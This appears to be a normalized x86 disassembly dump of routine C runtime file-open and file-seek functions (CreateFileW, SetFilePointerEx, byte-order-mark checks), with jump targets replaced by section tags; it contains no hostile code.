test esi esi
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov eax [ ebp - 0x1c ]
call sub_430f56
mov [ eax ] esi
jmp r-xdata
call sub_40d2b6
retn
or eax 0xffffffff
jmp r-xdata
sub_43dc45
cmp [ ebp - 0x24 ] 0x0
je r-xdata
retn
test esi esi
je r-xdata
push [ ebp - 0x1c ]
call sub_438db5
pop ecx
mov eax [ ebp - 0x1c ]
mov edx eax
sar edx 0x6
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
sub_43dc7c
push 0x10
push r--data
call sub_40d270
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_40d2b6
retn
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x20 ]
push eax
call sub_43e542
add esp 0x1c
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43dd1c
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
add eax 0x1
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_43dd1c
cmp [ ebp - 0x20 ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_438db5
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
sub_43dd48
push 0x10
push r--data
call sub_40d270
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_40d2b6
retn
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x20 ]
push eax
call sub_43e60b
add esp 0x1c
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43dde8
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
add eax 0x1
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_43dde8
cmp [ ebp - 0x20 ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_438db5
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
sub_43de14
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push [ eax ]
mov eax [ ebp + 0x1c ]
push [ eax ]
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43e542
add esp 0x1c
pop ebp
retn
sub_43de46
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push [ eax ]
mov eax [ ebp + 0x1c ]
push [ eax ]
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43e60b
add esp 0x1c
pop ebp
retn
sub_43de78
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push [ eax ]
mov eax [ ebp + 0x1c ]
push [ eax ]
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43e542
add esp 0x1c
pop ebp
retn
sub_43deaa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push [ eax ]
mov eax [ ebp + 0x1c ]
push [ eax ]
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43e60b
add esp 0x1c
pop ebp
retn
sub_43dedc
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
and eax 0x3f
push ebx
push edi
mov edi [ ebp + 0x28 ]
xor ebx ebx
sar edx 0x6
imul ecx eax 0x30
mov [ edi ] bl
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x80
jne r-xdata
push esi
mov esi [ ebp + 0x24 ]
test esi 0x74000
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
and eax 0x74000
cmp eax 0x4000
je r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
push eax
call sub_42b0da
pop ecx
test eax eax
jne r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov [ edi ] bl
cmp eax 0x10000
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_430e5d
int3
mov eax [ ebp - 0x4 ]
and eax 0x74000
jne r-xdata
xor eax eax
test [ ebp + 0xc ] 0x40
jne r-xdata
mov ecx 0x301
mov eax esi
and eax ecx
cmp eax ecx
jne r-xdata
cmp eax 0x14000
je r-xdata
or esi eax
jmp r-xdata
or esi 0x4000
mov eax [ ebp + 0x10 ]
mov edx 0xc0000000
and eax edx
mov ecx ebx
mov esi ebx
cmp eax 0x40000000
je r-xdata
test esi 0x70000
je r-xdata
mov [ edi ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
push eax
push [ ebp + 0x8 ]
call sub_445bf6
mov edx eax
add esp 0xc
test edx edx
jle r-xdata
cmp eax edx
jne r-xdata
cmp eax 0x40000
je r-xdata
xor esi esi
inc esi
cmp eax 0x4
jbe r-xdata
cmp edx 0xffffffff
je r-xdata
lea ecx [ esi - 0x1 ]
neg ecx
sbb ecx ecx
and esi ecx
mov [ edi ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
test esi esi
je r-xdata
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_43ed63
add esp 0x10
or eax edx
je r-xdata
cmp eax 0x5
je r-xdata
call sub_430f56
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp edx 0x2
je r-xdata
movsx eax [ edi ]
mov esi ebx
mov [ ebp - 0x4 ] ebx
sub eax 0x1
je r-xdata
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_43ed63
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
pop esi
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp edx 0x3
jne r-xdata
push 0x3
mov [ ebp - 0x4 ] 0xbfbbef
pop esi
sub eax 0x1
jne r-xdata
mov ecx [ ebp + 0x10 ]
shr ecx 0x1f
jmp r-xdata
cmp eax 0xfeff
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_43ed63
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp eax 0xbfbbef
jne r-xdata
mov eax esi
sub eax ebx
push eax
lea eax [ ebp - 0x4 ]
add eax ebx
push eax
push [ ebp + 0x8 ]
call sub_4327e1
add esp 0xc
cmp eax 0xffffffff
je r-xdata
test esi esi
jle r-xdata
push 0x2
mov [ ebp - 0x4 ] 0xfeff
pop esi
jmp r-xdata
test ecx ecx
je r-xdata
push ebx
push ebx
push 0x2
push [ ebp + 0x8 ]
call sub_43ed63
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov [ edi ] 0x1
jmp r-xdata
add ebx eax
cmp esi ebx
jg r-xdata
mov [ edi ] 0x2
jmp r-xdata
jmp r-xdata
sub_43e129
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
or eax [ ebp + 0x24 ]
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0xc ]
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
pop ebp
retn
sub_43e14e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and eax 0x3
sub eax 0x0
je r-xdata
mov eax 0x80000000
pop ebp
retn
sub eax 0x1
je r-xdata
test [ ebp + 0x8 ] 0x70000
setne cl
test [ ebp + 0x8 ] 0x8
setne al
and cl al
movzx eax cl
neg eax
sbb eax eax
and eax 0x80000000
add eax 0x40000000
pop ebp
retn
sub eax 0x1
je r-xdata
mov eax 0xc0000000
pop ebp
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
pop ebp
retn
sub_43e1b1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
jg r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp eax 0x600
je r-xdata
push 0x3
test eax eax
je r-xdata
push 0x5
jmp r-xdata
cmp eax edx
je r-xdata
cmp eax 0x100
je r-xdata
pop eax
pop ebp
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
pop ebp
retn
push 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp eax 0x300
jne r-xdata
push 0x2
jmp r-xdata
sub_43e221
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
push esi
mov esi [ ebp + 0x8 ]
and eax 0x3
push edi
mov edi 0x80000000
mov [ esi ] 0x0
sub eax 0x0
je r-xdata
mov eax edi
sub eax 0x1
je r-xdata
xor eax eax
sub eax ecx
je r-xdata
test ebx 0x70000
setne cl
test bl 0x8
setne al
and cl al
movzx eax cl
neg eax
sbb eax eax
and eax edi
add eax 0x40000000
jmp r-xdata
sub eax 0x1
je r-xdata
mov edi 0x8000
test edi ebx
jne r-xdata
or [ esi ] 0x10
xor eax eax
inc eax
jmp r-xdata
sub eax ecx
je r-xdata
push ebx
mov [ esi + 0x4 ] eax
call sub_43e1b1
pop ecx
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax 0xc0000000
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
mov ecx 0x100
test ecx ebx
je r-xdata
test ebx 0x74000
jne r-xdata
and [ esi + 0x14 ] 0x0
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] 0x80
test bl bl
jns r-xdata
push 0x2
sub eax ecx
je r-xdata
test bl 0x40
je r-xdata
mov eax [ rw-data ]
not eax
and eax [ ebp + 0x14 ]
test al al
js r-xdata
or [ esi ] 0x80
lea eax [ ebp - 0x4 ]
push eax
call sub_42b0da
pop ecx
test eax eax
jne r-xdata
push 0x3
jmp r-xdata
sub eax 0x40
je r-xdata
test ebx 0x1000
je r-xdata
or [ esi + 0x14 ] 0x4000000
or [ esi + 0x4 ] 0x10000
or [ esi + 0xc ] 0x4
mov [ esi + 0x10 ] 0x1
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
cmp [ ebp - 0x4 ] edi
je r-xdata
pop eax
jmp r-xdata
xor eax eax
cmp [ esi + 0x4 ] edi
sete al
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
test ebx 0x2000
je r-xdata
or [ esi + 0x10 ] ecx
test bl 0x20
je r-xdata
or [ esi + 0x14 ] 0x2000000
test bl 0x10
je r-xdata
or [ esi + 0x14 ] 0x8000000
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
or [ esi + 0x14 ] 0x10000000
sub_43e39d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
xor eax eax
pop ebp
retn
sub eax ecx
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub eax ecx
je r-xdata
push 0x2
sub eax ecx
je r-xdata
push 0x3
jmp r-xdata
sub eax 0x40
je r-xdata
pop eax
pop ebp
retn
xor eax eax
cmp [ ebp + 0xc ] 0x80000000
sete al
pop ebp
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
pop ebp
retn
sub_43e3f2
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi 0x8000
test [ ebp + 0x8 ] esi
je r-xdata
test [ ebp + 0x8 ] 0x74000
je r-xdata
xor al al
lea eax [ ebp - 0x4 ]
push eax
call sub_42b0da
pop ecx
test eax eax
jne r-xdata
mov al 0x1
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
cmp [ ebp - 0x4 ] esi
setne al
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_43e43a
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
and eax 0x3f
mov edx esi
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
mov al [ eax + ecx + 0x28 ]
test al 0x48
je r-xdata
test al al
jns r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
push 0x2
push 0xffffffff
push 0xffffffff
push esi
call sub_43ed63
mov edi eax
mov ebx edx
mov ecx edi
add esp 0x10
and ecx ebx
cmp ecx 0xffffffff
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push 0x1
push eax
push esi
call sub_445bf6
add esp 0xc
test eax eax
jne r-xdata
call sub_430f43
cmp [ eax ] 0x83
jne r-xdata
xor eax eax
push eax
push eax
push eax
push esi
call sub_43ed63
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
call sub_430f56
mov eax [ eax ]
jmp r-xdata
xor eax eax
push ebx
push edi
push esi
call sub_44536f
add esp 0xc
cmp eax 0xffffffff
je r-xdata
pop edi
pop ebx
sub_43e502
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push 0x0
lea eax [ ebp - 0x4 ]
or esi 0xffffffff
push eax
push [ ebp + 0x14 ]
mov [ ebp - 0x4 ] esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43dc7c
add esp 0x18
test eax eax
jne r-xdata
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_43e542
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
call sub_445091
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp - 0x4 ]
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43e60b
push esi
mov edi eax
call sub_42d3b1
add esp 0x20
mov eax edi
pop edi
pop esi
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_43e593
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_43dc7c
add esp 0x18
pop ebp
retn
sub_43e5cb
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push 0x0
lea eax [ ebp - 0x4 ]
or esi 0xffffffff
push eax
push [ ebp + 0x14 ]
mov [ ebp - 0x4 ] esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43dd48
add esp 0x18
test eax eax
jne r-xdata
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_43e60b
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x44 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call sub_43e221
add esp 0x10
lea edi [ ebp - 0x2c ]
mov esi eax
push 0x6
pop ecx
[ edi ] [ esi ]
or esi 0xffffffff
cmp [ ebp - 0x20 ] esi
jne r-xdata
call sub_438dd8
mov ebx [ ebp + 0xc ]
mov [ ebx ] eax
cmp eax esi
jne r-xdata
call sub_430f43
and [ eax ] 0x0
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
lea esi [ ebp - 0x2c ]
and [ ebp - 0x10 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x14 ] 0xc
sub esp 0x18
mov [ eax ] ecx
mov eax [ ebp + 0x14 ]
shr eax 0x7
not eax
and eax ecx
push 0x6
pop ecx
mov [ ebp - 0xc ] eax
mov edi esp
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
[ edi ] [ esi ]
call sub_43e129
mov edi eax
add esp 0x20
mov [ ebp - 0x8 ] edi
mov edx 0xc0000000
cmp edi 0xffffffff
jne r-xdata
call sub_430f43
and [ eax ] 0x0
mov [ ebx ] esi
call sub_430f56
mov [ eax ] 0x18
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov eax ecx
and eax edx
cmp eax edx
jne r-xdata
call sub_430f56
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_430f20
pop ecx
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
push edi
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_430f20
test [ ebp + 0x14 ] 0x1
je r-xdata
cmp eax 0x3
mov al [ ebp - 0x2c ]
jne r-xdata
mov al [ ebp - 0x2c ]
or al 0x40
jmp r-xdata
call sub_430f56
mov [ eax ] 0xd
jmp r-xdata
sub esp 0x18
lea eax [ ebp - 0x14 ]
and ecx 0x7fffffff
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x28 ] ecx
push 0x6
pop ecx
mov edi esp
push eax
push [ ebp + 0x10 ]
[ edi ] [ esi ]
call sub_43e129
mov edi eax
add esp 0x20
mov [ ebp - 0x8 ] edi
cmp edi 0xffffffff
jne r-xdata
push edi
push [ ebx ]
mov [ ebp - 0x1 ] al
call sub_438d21
mov dl [ ebp - 0x1 ]
pop ecx
pop ecx
mov ecx [ ebx ]
or dl 0x1
mov eax ecx
mov [ ebp - 0x1 ] dl
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov [ ebp - 0x2c ] dl
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x28 ] dl
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
test [ ebp + 0x14 ] 0x2
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x29 ] 0x0
je r-xdata
or al 0x8
lea eax [ ebp - 0x2 ]
mov [ ebp - 0x2 ] 0x0
push eax
push [ ebp + 0x14 ]
lea esi [ ebp - 0x2c ]
sub esp 0x18
push 0x6
pop ecx
mov edi esp
push [ ebx ]
[ edi ] [ esi ]
call sub_43dedc
add esp 0x24
test eax eax
je r-xdata
push [ ebx ]
call sub_43e43a
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov eax [ ebx ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul edx eax 0x30
mov al [ ebp - 0x2 ]
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edx + 0x29 ] al
mov ecx [ ebx ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul edx ecx 0x30
mov ecx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x14 ]
shr eax 0x10
xor al [ ecx + edx + 0x2d ]
and al 0x1
xor [ ecx + edx + 0x2d ] al
test [ ebp - 0x1 ] 0x48
jne r-xdata
mov esi eax
push [ ebx ]
call sub_43213b
pop ecx
mov eax esi
jmp r-xdata
mov esi [ ebp - 0x28 ]
mov ecx 0xc0000000
mov eax esi
and eax ecx
cmp eax ecx
jne r-xdata
test [ ebp + 0x14 ] 0x8
je r-xdata
xor eax eax
test [ ebp + 0x14 ] 0x1
je r-xdata
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
or [ eax + ecx + 0x28 ] 0x20
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
sub esp 0x18
lea eax [ ebp - 0x14 ]
and esi 0x7fffffff
mov [ ebp - 0x28 ] esi
lea esi [ ebp - 0x2c ]
push 0x6
pop ecx
mov edi esp
push eax
push [ ebp + 0x10 ]
[ edi ] [ esi ]
call sub_43e129
mov edx eax
add esp 0x20
cmp edx 0xffffffff
jne r-xdata
mov ecx [ ebx ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x18 ] edx
call [ GetLastError@IAT ]
push eax
call sub_430f20
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
push [ ebx ]
call sub_438eea
pop ecx
jmp r-xdata
pop ecx
jmp r-xdata
sub_43e934
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_43dd48
add esp 0x18
pop ebp
retn
sub_43e954
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_430f56
mov [ eax ] 0x9
jmp r-xdata
call sub_430f56
mov [ eax ] 0x9
call sub_430e30
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
movzx eax [ eax + ecx + 0x28 ]
and eax 0x40
pop ebp
retn
sub_43e9aa
push 0x14
push r--data
call sub_40d270
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
jmp r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
call sub_430e30
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov [ ebp - 0x20 ] ecx
mov eax [ ebx * 4 + rw-data ]
movzx eax [ eax + ecx + 0x28 ]
and eax 0x1
je r-xdata
push esi
call sub_438cfe
pop ecx
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_43eb9a
add esp 0xc
mov edi eax
mov [ ebp - 0x1c ] edi
call sub_430f56
mov [ eax ] 0x9
call sub_430f43
and [ eax ] 0x0
jmp r-xdata
call sub_40d2b6
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43ea6c
mov eax edi
jmp r-xdata
sub_43ea95
push 0x1c
push r--data
call sub_40d270
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
jmp r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
call sub_430e30
cmp edi [ rw-data ]
jae r-xdata
or esi 0xffffffff
mov edx esi
mov ecx edi
sar ecx 0x6
mov [ ebp - 0x1c ] ecx
mov eax edi
and eax 0x3f
imul edx eax 0x30
mov [ ebp - 0x20 ] edx
mov eax [ ecx * 4 + rw-data ]
movzx eax [ eax + edx + 0x28 ]
and eax 0x1
je r-xdata
push edi
call sub_438cfe
pop ecx
or esi 0xffffffff
mov [ ebp - 0x2c ] esi
mov ebx esi
mov [ ebp - 0x28 ] ebx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_43ebf1
add esp 0x10
mov esi eax
mov [ ebp - 0x2c ] esi
mov ebx edx
mov [ ebp - 0x28 ] ebx
call sub_430f56
mov [ eax ] 0x9
call sub_430f43
and [ eax ] 0x0
jmp r-xdata
mov eax esi
call sub_40d2b6
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43eb6d
mov edx ebx
jmp r-xdata
sub_43eb9a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_438f7b
pop ecx
cmp eax 0xffffffff
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_43ec6f
mov edx eax
add esp 0xc
cmp edx 0xffffffff
je r-xdata
call sub_430f56
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
mov eax esi
and esi 0x3f
sar eax 0x6
imul ecx esi 0x30
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfd
mov eax edx
pop esi
pop ebp
retn
sub_43ebf1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_438f7b
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x9
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
and eax edx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_430f20
pop ecx
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax edi
mov edx edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx esi
and esi 0x3f
sar ecx 0x6
imul esi esi 0x30
mov ecx [ ecx * 4 + rw-data ]
and [ ecx + esi + 0x28 ] 0xfd
sub_43ec6f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x10 ]
push esi
push 0x1
push eax
xor esi esi
push esi
push esi
push [ ebp + 0x8 ]
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x8 ]
push ecx
cdq
push edx
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
call [ SetFilePointerEx@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_430f20
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp - 0x4 ] esi
jl r-xdata
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn
jg r-xdata
push esi
push esi
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ SetFilePointerEx@IAT ]
call sub_430f56
mov [ eax ] 0x16
cmp eax 0x7fffffff
